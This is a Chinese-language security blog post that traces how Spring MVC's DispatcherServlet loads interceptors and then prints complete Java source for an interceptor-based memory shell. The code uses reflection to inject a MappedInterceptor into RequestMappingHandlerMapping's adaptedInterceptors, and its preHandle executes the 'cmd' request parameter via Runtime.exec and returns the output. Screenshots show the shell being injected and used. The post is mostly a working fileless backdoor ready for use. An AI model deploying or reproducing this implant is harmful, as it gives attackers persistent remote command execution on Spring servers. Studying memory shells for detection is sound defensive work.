[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201223-a9766ff2-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201223-a9766ff2-ab6b-1.png)

### 流程分析

#### Interceptor 调用

在 org.springframework.web.servlet.DispatcherServlet 的 doDispatch 方法下断点

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201227-aba5e0b4-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201227-aba5e0b4-ab6b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201229-ad305810-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201229-ad305810-ab6b-1.png)

后面会调用 mappedHandler.applyPreHandle 方法

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201233-af679ff8-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201233-af679ff8-ab6b-1.png)

这里遍历使用的 interceptors，并调用其 preHandle 方法，

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201236-b17a902a-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201236-b17a902a-ab6b-1.png)

#### 添加 Interceptor

进入 getHandler 方法，这里主要是获取 Interceptor

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201240-b3986e72-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201240-b3986e72-ab6b-1.png)

进入 gethandler

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201244-b6272f70-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201244-b6272f70-ab6b-1.png)

进入 getHandlerExecutionChain

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201248-b8aef728-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201248-b8aef728-ab6b-1.png)

这里可以看到将 Interceptor 遍历出来，在添加到 chain

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201252-bae107f2-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201252-bae107f2-ab6b-1.png)

在这里可以看到所有的监听器

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201256-bd2ea88e-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201256-bd2ea88e-ab6b-1.png)

在这里观察一下数据结构，发现是 MappedInterceptor 中包含了 url 地址和自定义拦截器的实例对象

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201300-bf550fd6-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201300-bf550fd6-ab6b-1.png)

需要反射创建一个 MappedInterceptor 对象，并添加上我们的 interceptor 类和 includePatterns

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201304-c1ba52d6-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201304-c1ba52d6-ab6b-1.png)

这里判断了访问地址和 Interceptor 地址是否符合要去，如果不符合的话就不会加载

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201309-c508b3d8-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201309-c508b3d8-ab6b-1.png)

### 内存马

```
package com.naihe.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.MappedInterceptor;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

@Controller
public class TestInterceptor{
    @ResponseBody
    @RequestMapping(value = "/interceptor", method = RequestMethod.GET)
    public String inject() throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {
        try{
            // 获取context
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            // 从context中获取AbstractHandlerMapping的实例对象
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");

            // 反射获取adaptedInterceptors属性
            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<HandlerInterceptor> adaptedInterceptors = (java.util.ArrayList<HandlerInterceptor>)field.get(abstractHandlerMapping);

            //生成一个MappedInterceptor对象
            MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]{"/cl1"},null,new InterceptorDemo());

            // 添加到adaptedInterceptors中
            adaptedInterceptors.add(mappedInterceptor);  //  添加全局interceptor

            return "ok";
        } catch (Exception e) {
            return "no";
        }
    }
}

class InterceptorDemo implements HandlerInterceptor {

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        InputStream is = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        InputStreamReader isr = new InputStreamReader(is, "UTF-8");
        BufferedReader br = new BufferedReader(isr);
        String str = "";
        String line = "";

        while ((line = br.readLine())!=null){
            str+=line;
        }
        is.close();
        br.close();
        response.getWriter().write(str);
        return false;
    }
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
    }

    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
    }
}


```

### 效果

访问 cl1，注意在这里 cl1 是必须存在的，前面给了源码

访问一个普通页面，并传参

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201317-c9ba0dbe-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201317-c9ba0dbe-ab6b-1.png)

访问注入界面，注入内存马

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201321-cbca418c-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201321-cbca418c-ab6b-1.png)

再次访问之前的页面

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220324201324-cdd1c4aa-ab6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220324201324-cdd1c4aa-ab6b-1.png)